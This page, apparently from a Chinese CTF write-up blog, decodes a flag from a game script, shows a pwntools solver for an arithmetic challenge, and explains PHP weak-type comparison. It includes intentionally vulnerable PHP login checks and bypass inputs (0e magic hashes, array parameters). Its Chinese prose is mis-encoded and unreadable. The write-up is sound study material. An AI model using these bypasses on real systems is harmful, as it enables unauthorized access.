class="line">main_43@act_dialog^^^main_45@act_se^^^0^^239188159239188159239188159239188154227128142229144172232175180230142165232167166228186134232191153228184170231165158231167152231187132231187135231154132228186186239188140233131189230151160228184128228190139229164150229156176232142183229190151228186134229188186229164167231154132229138155233135143227128130227128143013010035048</span><br><span class="line">main_45@act_se^filename@121117107117109111095048048049048046109112051#vol@056048048^^main_47@act_dialog^^^0^^052053045048</span><br><span class="line">main_47@act_dialog^^^main_49@act_se^^^0^^239188159239188159239188159239188154227128142230184151233128143230181139232175149227128129232189175228187182231160180232167163227128129229188128229143145232191144231187180046046046230149176228184141230184133231154132233171152231171175231165158231167152230138128230156175229156168232191153228184170231187132231187135233135140228187163228187163231155184228188160227128130227128143013010035048</span><br><span class="line">main_49@act_se^filename@121117107117109111095048048049049046109112051#vol@056048048^^main_51@act_dialog^^^0^^052057045048</span><br><span class="line">main_51@act_dialog^^^main_53@act_se^^^0^^239188159239188159239188159239188154227128142229144132231167141229165150233161185229165150233135145227128129228191157231160148229138160229136134227128129229164167229142130111102102101114239188140229133168233131189232162171232191153228184170231187132231187135231154132228186186230143161229156168230137139228184173227128130227128143013010035048</span><br><span class="line">main_53@act_se^filename@121117107117109111095048048049050046109112051#vol@056048048^^main_55@act_dialog^^^0^^053051045048</span><br><span class="line">main_55@act_dialog^^^main_57@act_se^^^0^^239188159239188159239188159239188154227128142229144172232175180228187150228187172232191152228188154231187143229184184228184190229138158228184128231167141231165158231167152228187170229188143239188140228184128231190164228186186229155180229156168229165182232140182229186151230151129232190185231148168228184141231159165233129147229147170233135140230157165231154132229164167233135143231187143232180185229164167229150157231137185229150157227128130227128143013010035048</span><br><span class="line">main_57@act_se^filename@121117107117109111095048048049051046109112051#vol@056048048^^main_59@act_dialog^^^0^^053055045048</span><br><span class="line">main_59@act_dialog^^^main_61@act_se^^^0^^239188159239188159239188159239188154227128142233130163228184170229165179228186186232191152228188154230139191230137128232176147032102108097103032230157165232175177230131145228189160227128130230136145229183178231187143229129183229129183230139191229136176228186134233130163228184170228184156232165191227128130227128143013010035048</span><br><span class="line">main_61@act_se^filename@121117107117109111095048048049052046109112051#vol@056048048^^main_63@act_dialog^^^0^^054049045048</span><br><span class="line">main_63@act_dialog^^^main_65@act_se^^^0^^239188159239188159239188159239188154227128142230136145232191153229176177230138138229174131229145138232175137228189160239188140229141131228184135228184141232166129231157128228186134229165185231154132233129147239188129227128143013010035048</span><br><span class="line">main_65@act_se^filename@121117107117109111095048048049053046109112051#vol@056048048^^main_66@act_bg^^^0^^054053045048</span><br><span class="line">main_66@act_bg^id@049#filename@099111110118101114049046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_67@act_wait^^^0^^054054045048</span><br><span class="line">main_67@act_wait^time@051048048048^^main_68@act_bg^^^0^^054055045048</span><br><span class="line">main_68@act_bg^id@049#filename@100111111114046106112103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_69@act_cstand^^^0^^054056045048</span><br><span class="line">main_69@act_cstand^id@049#name@083104105110111#face@050#x@049051048#y@049051048#loc@^^main_71@act_dialog^^^0^^054057045048</span><br><span class="line">main_71@act_dialog^^^main_73@act_deletecstand^^^0^^239188129239188129013010035048</span><br><span class="line">main_73@act_deletecstand^id@048^^main_74@act_se^^^0^^055051045048</span><br><span class="line">main_74@act_se^filename@121117107117109111095048048049054046109112051#vol@056048048^^main_75@act_bg^^^0^^055052045048</span><br><span class="line">main_75@act_bg^id@049#filename@099111110118101114050046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_76@act_wait^^^0^^055053045048</span><br><span class="line">main_76@act_wait^time@051048048048^^main_77@act_se^^^0^^055054045048</span><br><span class="line">main_77@act_se^filename@121117107117109111095048048049055046109112051#vol@056048048^^main_78@act_bg^^^0^^055055045048</span><br><span class="line">main_78@act_bg^id@049#filename@079110108121067078083083046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_79@act_wait^^^0^^055056045048</span><br><span class="line">main_79@act_wait^time@049053048048048^^main_80@act_bg^^^0^^055057045048</span><br><span class="line">main_80@act_bg^id@049#filename@098108097110107046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_81@act_stopbgm^^^0^^056048045048</span><br><span class="line">main_81@act_stopbgm^^^main_82@act_cstand^^^0^^056049045048</span><br><span class="line">main_82@act_cstand^id@048#name@083104105110111#face@051#x@049051048#y@049051048#loc@^^main_83@act_se^^^0^^056050045048</span><br><span class="line">main_83@act_se^filename@121117107117109111095048048049056046109112051#vol@056048048^^main_85@act_dialog^^^0^^056051045048</span><br><span class="line">main_85@act_dialog^^^main_87@act_bg^^^0^^083104105110111058227128142231165158226128148226128148231167152226128148226128148228186186226128148226128148227128143013010035048</span><br><span class="line">main_87@act_bg^id@049#filename@100111111114046106112103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_88@act_bgm^^^0^^056055045048</span><br><span class="line">main_88@act_bgm^filename@050053046109112051#vol@052057056^^main_89@act_deletecstand^^^0^^056056045048</span><br><span class="line">main_89@act_deletecstand^id@048^^main_90@act_cstand^^^0^^056057045048</span><br><span class="line">main_90@act_cstand^id@048#name@067078083083#face@049#x@049051048#y@049051048#loc@^^main_91@act_se^^^0^^057048045048</span><br><span class="line">main_91@act_se^filename@121117107117109111095048048049057046109112051#vol@056048048^^main_93@act_dialog^^^0^^057049045048</span><br><span class="line">main_93@act_dialog^^^main_95@act_se^^^0^^229143175231136177231154132229165179229173169058227128142228184141229143175228187165229144172228187150231158142232175180229147166227128130227128143013010035048</span><br><span class="line">main_95@act_se^filename@121117107117109111095048048050048046109112051#vol@056048048^^main_97@act_dialog^^^0^^057053045048</span><br><span class="line">main_97@act_dialog^^^main_99@act_se^^^0^^083104105110111058227128142231187191232137178229184189229173144239188140228184128229164180231153189229143145239188140231156139232181183230157165229190136229143175231136177046046046046046033033033033227128143013010035048</span><br><span class="line">main_99@act_se^filename@121117107117109111095048048050049046109112051#vol@056048048^^main_101@act_dialog^^^0^^057057045048</span><br><span class="line">main_101@act_dialog^^^main_103@act_se^^^0^^083104105110111058227128142233154190233129147228189160229176177230152175226128148226128148227128143013010035048</span><br><span class="line">main_103@act_se^filename@121117107117109111095048048050050046109112051#vol@056048048^^main_105@act_dialog^^^0^^049048051045048</span><br><span class="line">main_105@act_dialog^^^main_107@act_se^^^0^^083104105110111058227128142228184150231149140231172172228184128229143175231136177231154132032067078083083032229168152239188129227128143013010035048</span><br><span class="line">main_107@act_se^filename@121117107117109111095048048050052046109112051#vol@056048048^^main_109@act_dialog^^^0^^049048055045048</span><br><span class="line">main_109@act_dialog^^^main_111@act_se^^^0^^229143175231136177231154132229165179229173169058227128142230152175231154132239188140230136145229176177230152175032067078083083032229168152229147166227128130227128143013010035048</span><br><span class="line">main_111@act_se^filename@121117107117109111095048048050053046109112051#vol@056048048^^main_113@act_dialog^^^0^^049049049045048</span><br><span class="line">main_113@act_dialog^^^main_115@act_se^^^0^^067078083083032229168152058227128142230136145228187172229135157232129154231189145231187156229174137229133168229183165228189156229174164230172162232191142230175143228184128228189141229175185231189145231187156229174137229133168230136150229188128229143145232191144231187180230132159229133180232182163231154132230150176231148159229138155233135143229138160229133165239188129227128143013010035048</span><br><span class="line">main_115@act_se^filename@121117107117109111095048048050054046109112051#vol@056048048^^main_117@act_dialog^^^0^^049049053045048</span><br><span class="line">main_117@act_dialog^^^main_119@act_se^^^0^^067078083083032229168152058227128142229185182228184141230152175228187128228185136229143175230128149231154132233130170230149153231187132231187135229147166239188129227128143013010035048</span><br><span class="line">main_119@act_se^filename@121117107117109111095048048050055046109112051#vol@056048048^^main_121@act_dialog^^^0^^049049057045048</span><br><span class="line">main_121@act_dialog^^^main_123@act_se^^^0^^067078083083032229168152058227128142232175180228186134232191153228185136229164154239188140229133182229174158228189160230160185230156172228184141229156168230132143230136145228187172229134153228186134228187128228185136229137167230156172239188140228189160229133179229191131231154132229143170230156137032102108097103032229175185229144167239188129227128143013010035048</span><br><span class="line">main_123@act_se^filename@121117107117109111095048048050056046109112051#vol@056048048^^main_125@act_dialog^^^0^^049050051045048</span><br><span class="line">main_125@act_dialog^^^main_127@act_se^^^0^^067078083083032229168152058227128142230136145232191153229176177229145138232175137228189160229147166239188129227128143013010035048</span><br><span class="line">main_127@act_se^filename@121117107117109111095048048050057046109112051#vol@056048048^^main_129@act_dialog^^^0^^049050055045048</span><br><span class="line">main_129@act_dialog^^^main_131@act_deletecstand^^^0^^083104105110111058227128142229165185230173163229156168230130132230130132230139137232191145229146140230136145231154132232183157231166187046046046229165189231180167229188160239188129227128143013010035048</span><br><span class="line">main_131@act_deletecstand^id@048^^main_132@act_picture^^^0^^049051049045048</span><br><span class="line">main_132@act_picture^id@048#filename@067078083083095112110103046112110103#x@053048048#y@051048048#opacity@049#xscale@049046051#yscale@049046051#ro@048^^main_133@act_se^^^0^^049051050045048</span><br><span class="line">main_133@act_se^filename@121117107117109111095048048051048046109112051#vol@056048048^^main_135@act_dialog^^^0^^049051051045048</span><br><span class="line">main_135@act_dialog^^^main_137@act_se^^^0^^083104105110111058227128142230157165229136176229175185232175157230161134229137141233157162228186134239188129227128143013010035048</span><br><span class="line">main_137@act_se^filename@121117107117109111095048048051049046109112051#vol@056048048^^main_139@act_dialog^^^0^^049051055045048</span><br><span class="line">main_139@act_dialog^^^main_142@act_dialog^^^0^^067078083083032229168152058227128142102108097103229176177230152175226128148226128148239188129102108097103230152175099110115115123087048119033089048117095052114101095075049110103095048102095082051086051051115051051095033033033033033033125229147166239188129232174176228189143228186134229144151239188159227128143013010035049</span><br><span class="line">main_142@act_dialog^^^main_144@act_deletepicture^^^0^^067078083083032229168152058227128142229191171229142187230143144228186164229144167239188129227128143013010035048</span><br><span class="line">main_144@act_deletepicture^id@048^^main_145@act_se^^^0^^049052052045048</span><br><span class="line">main_145@act_se^filename@121117107117109111095048048051050046109112051#vol@056048048^^main_147@act_dialog^^^0^^049052053045048</span><br><span class="line">main_147@act_dialog^^^main_150@act_dialog^^^0^^083104105110111058227128142046046046046231173137231173137239188140229165185232175180228186134229149165239188159227128143013010035049</span><br><span class="line">main_150@act_dialog^^^main_152@act_shutdown^^^0^^045045084072069032069078068045045013010035048</span><br><span class="line">main_152@act_shutdown^^^^^^0^^049053050045048</span><br><span class="line">main_155@act_function^sign@114099108105099107040041^^^main_157@act_endfunction^^1^^049053053045048</span><br><span class="line">main_157@act_endfunction^^^^^^0^^049053055045048</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åå»å®˜æ–¹çš„æŠ€æœ¯æ–‡æ¡£é‚£æœç´¢äº†ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¬¦å·â€œ@â€è¡¨ç¤ºå½“å‰è¡Œæ˜¯å¯æ‰§è¡Œå‘½ä»¤ï¼ŒActionæ˜¯å‘½ä»¤åç§°ï¼ŒParameterNameæ˜¯å‘½ä»¤å‚æ•°çš„åå­—ï¼ŒParameterValueExpressionæ˜¯è¦èµ‹å€¼ç»™ç­‰å·å·¦ä¾§å‚æ•°çš„è¡¨è¾¾å¼ï¼Œçœç•¥å·è¡¨ç¤ºä¸€ä¸ªå‘½ä»¤æ—¢å¯ä»¥æ²¡æœ‰&lt;å‚æ•°, å€¼&gt;å¯¹ï¼Œä¹Ÿå¯ä»¥æœ‰å¤šä¸ª&lt;å‚æ•°, å€¼&gt;å¯¹ã€‚æ³¨æ„åˆ°ï¼Œä¸€ä¸ªå‘½ä»¤å¦‚æœå¸¦æœ‰å¤šä¸ªå‚æ•°æ—¶ï¼Œå‚æ•°æ˜¯æ²¡æœ‰å…ˆåé¡ºåºè¦æ±‚çš„ï¼›è€Œç¬¦å·â€œ#â€è¡¨æ˜å½“å‰è¡Œæ˜¯æ³¨é‡Šï¼Œç¼–è¯‘å™¨åœ¨åšè¯­æ³•åˆ†ææ—¶å°†ç•¥è¿‡å®ƒï¼›æ¨å¯¼ç¬¦å·Dialogä»£è¡¨åœ¨æ¸¸æˆæ‰§è¡Œè¿‡ç¨‹ä¸­è¦æ˜¾ç¤ºçš„æ–‡æœ¬ï¼Œè¿™æ˜¯AVGæ¸¸æˆä½¿ç”¨é¢‘ç‡æœ€é«˜çš„å‘½ä»¤ï¼Œç”±äºæ–‡æœ¬çš„æ˜¾ç¤ºå­˜åœ¨è·¨è¡Œçš„æƒ…å†µï¼Œå› æ­¤å®ƒä»¥ä¸€ç§ä¸Šä¸‹æ–‡æœ‰å…³æ–‡æ³•æ¥è¡¨ç¤º</span><br></pre></td></tr></table></figure>

<p>Dialogæ˜¯æ–‡æœ¬æ¡†ç›¸å…³çš„ï¼Œç„¶åè¿™äº›æ•°å­—ä¹Ÿæœ‰è§„å¾‹ä¸‰ä¸ªä¸€ç»„çš„åƒasciiç ä¸€æ ·çš„ï¼Œç„¶åå°è¯•æœcnss{çš„asciiç 099110115115123æœåˆ°äº†ï¼ŒæŠŠåé¢çš„å­—ç¬¦ä¸²æ‹·è´ä¸‹æ¥ç„¶åpythonä¸‰ä¸ªä¸‰ä¸ªè¯»æ‹¿åˆ°flag cnss{W0w!Y0u_4re_K1ng_0f_R3V33s33_!!!!!!}</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;099110115115123087048119033089048117095052114101095075049110103095048102095082051086051051115051051095033033033033033033125229147166239188129232174176228189143228186134229144151239188159227128143013010035049&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i:i+<span class="number">3</span>])),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ğŸ®-ncï¼Œå¯åŠ¨"><a href="#ğŸ®-ncï¼Œå¯åŠ¨" class="headerlink" title="ğŸ® ncï¼Œå¯åŠ¨"></a>ğŸ® ncï¼Œå¯åŠ¨</h2><p>ncè¿</p>
<h2 id="ğŸ˜¡-è®©æˆ‘è®¿é—®ï¼ï¼ï¼"><a href="#ğŸ˜¡-è®©æˆ‘è®¿é—®ï¼ï¼ï¼" class="headerlink" title="ğŸ˜¡ è®©æˆ‘è®¿é—®ï¼ï¼ï¼"></a>ğŸ˜¡ è®©æˆ‘è®¿é—®ï¼ï¼ï¼</h2><p>pwntools</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">host,port = <span class="string">&quot;43.156.14.141&quot;</span>,<span class="number">1141</span></span><br><span class="line">p = remote(host,port)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;(y/n)\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;(y/n)\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    string = p.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    n1,operator,n2 = re.findall(<span class="string">r&#x27;(\d+|\+|\-|\*|\/)&#x27;</span>, string)</span><br><span class="line">    n1,n2 = <span class="built_in">int</span>(n1),<span class="built_in">int</span>(n2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">        tmp = <span class="built_in">str</span>(n1 + n2)</span><br><span class="line">        p.sendline(tmp.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = <span class="built_in">str</span>(n1 - n2)</span><br><span class="line">        p.sendline(tmp.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    ss = <span class="built_in">input</span>()</span><br><span class="line">    p.sendline(ss.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(p.recvline())</span><br></pre></td></tr></table></figure>



<h2 id="ğŸ‘€-ä½ çš„åå­—"><a href="#ğŸ‘€-ä½ çš„åå­—" class="headerlink" title="ğŸ‘€ ä½ çš„åå­—"></a>ğŸ‘€ ä½ çš„åå­—</h2></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-09-18</span><i class="fa fa-tag"></i><a class="tag" href="/tags/ctf-writeup/" title="ctf writeup">ctf writeup </a><span class="leancloud_visitors"></span><span>About 4426 words, 14 min 45 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/09/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">phpå¼±ç±»å‹</a></h3></div><div class="post-content"><div class="card"><p><h2 id="phpå¼±ç±»å‹"><a href="#phpå¼±ç±»å‹" class="headerlink" title="phpå¼±ç±»å‹:"></a>phpå¼±ç±»å‹:</h2><p>&#x3D;&#x3D;&#x3D; åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒå€¼æ˜¯å¦ç›¸ç­‰<br>&#x3D;&#x3D; åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒå€¼<br>å¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œ</p>
<p>$a&#x3D;â€123â€;@$b&#x3D;123;<br>a&#x3D;&#x3D;b; TRUE<br>a&#x3D;&#x3D;&#x3D;b; FALSE<br>0&#x3D;&#x3D;â€™ â€˜; TRUE<br>â€˜1111â€™&#x3D;&#x3D;TRUE; TRUE<br>â€˜0â€™&#x3D;&#x3D;â€™falseâ€™; false<br>â€˜0â€™&#x3D;&#x3D;false;true<br>0x01&#x3D;1; FLASE<br>0x01&#x3D;TRUE; TRUE<br>[0]&#x3D;[NULL]; TRUE</p>
<p>NULL&#x3D;FALSE; TRUE<br>0e123465&#x3D;&#x3D;0e5555555; TRUE (0eç»•è¿‡)</p>
<h3 id="æ¡ˆä¾‹1-md5å¼±æ¯”è¾ƒ"><a href="#æ¡ˆä¾‹1-md5å¼±æ¯”è¾ƒ" class="headerlink" title="æ¡ˆä¾‹1 md5å¼±æ¯”è¾ƒ"></a>æ¡ˆä¾‹1 md5å¼±æ¯”è¾ƒ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³•<span class="number">1</span> <span class="number">0</span>eç»•è¿‡(<span class="number">0</span>e ç§‘å­¦è®¡æ•°æ³•)</span><br><span class="line">æ–¹æ³•<span class="number">2</span> md5å¤„ç†æ•°ç»„çš„æ—¶å€™ä¼šè¿”å›<span class="literal">null</span>çš„å€¼ï¼Œå¯ä»¥ä¼ é€’ä¸¤ä¸ªæ•°ç»„è¿›å»ä½¿å¾—<span class="literal">null</span>==<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!=<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&quot;param1&quot;</span>])==<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=QNKCDZO&amp;param2=<span class="number">240610708</span> <span class="comment">//0eç»•è¿‡ success</span></span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹2-sha1å¼±ç±»å‹"><a href="#æ¡ˆä¾‹2-sha1å¼±ç±»å‹" class="headerlink" title="æ¡ˆä¾‹2 sha1å¼±ç±»å‹"></a>æ¡ˆä¾‹2 sha1å¼±ç±»å‹</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³•<span class="number">1</span> <span class="number">0</span>eç»•è¿‡(<span class="number">0</span>e ç§‘å­¦è®¡æ•°æ³•)</span><br><span class="line">æ–¹æ³•<span class="number">2</span> sha1å¤„ç†æ•°ç»„çš„æ—¶å€™ä¼šè¿”å›<span class="literal">null</span>çš„å€¼ï¼Œå¯ä»¥ä¼ é€’ä¸¤ä¸ªæ•°ç»„è¿›å»ä½¿å¾—<span class="literal">null</span>==<span class="literal">null</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> =<span class="string">&quot;flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] )</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Your password can not be your name&lt;/p&gt;&#x27;</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;FLAG:&#x27;</span>.flag);</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password.&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Login first!&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]=<span class="number">1</span>&amp;password[]=<span class="number">2</span> <span class="comment">//md5å’Œsha1æ— æ³•å¤„ç†æ•°ç»„ä¼ å…¥ä¼šè¿”å›NULL NULL</span></span><br></pre></td></tr></table></figure>

<h3 id="æ¡ˆä¾‹3-jsonç›¸å…³"><a href="#æ¡ˆä¾‹3-jsonç›¸å…³" class="headerlink" title="æ¡ˆä¾‹3 jsonç›¸å…³"></a>æ¡ˆä¾‹3 jsonç›¸å…³</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">==å·åœ¨æ¯”è¾ƒå­—ç¬¦ä¸²å’Œæ•°å­—çš„æ—¶å€™ä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—å†è¿›è¡Œæ¯”è¾ƒ</span><br><span class="line"><span class="string">&quot;1234abcd&quot;</span> == <span class="number">1234</span> <span class="literal">true</span></span><br><span class="line"><span class="string">&quot;123abc&quot;</span> == <span class="number">123</span> <span class="literal">true</span></span><br><span class="line"><span class="string">&quot;abcd&quot;</span> == <span class="number">0</span> <span class="literal">true</span></span><br><span class="line">å­—ç¬¦ä¸²è¿ç»­å‰å‡ ä½æ˜¯æ•°å­—çš„è¯å°±ä¼šå–è¿™å‡ ä½ä¸ºè½¬æ¢çš„ç»“æœ</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>,<span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> =<span class="string">&quot;flag&quot;</span>;</span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;adminasdasdasd&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$message</span>-&gt;key ==<span class="variable">$key</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;------&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
